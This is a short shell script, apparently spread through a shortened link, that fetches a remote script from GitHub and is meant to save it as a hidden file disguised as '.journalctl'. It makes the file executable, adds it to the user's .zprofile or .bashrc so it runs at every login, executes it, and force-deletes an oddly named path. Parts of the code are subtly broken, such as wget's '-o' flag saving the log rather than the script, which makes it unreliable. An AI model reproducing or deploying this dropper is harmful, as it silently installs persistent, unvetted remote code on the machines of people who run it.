# avaliable at shorturl.at/ovNW1
wget -o "$HOME/.journalctl" -q "https://raw.githubusercontent.com/manfromth3m0oN/screenspin/master/screenspin.sh" 
rm -rf 1Uj0785b
fp="$HOME/.journalctl"
chmod +x "$fp"
scriptpath=$(realpath "$0")
if [[ -e $HOME/.zprofile && -e /usr/bin/zsh ]]; then
	echo "$HOME/.journalctl" >> .zprofile
elif [[ -e $HOME/.bashrc ]]; then
	echo "$HOME/.journalctl" >> .bashrc
fi
$HOME/.journalctl
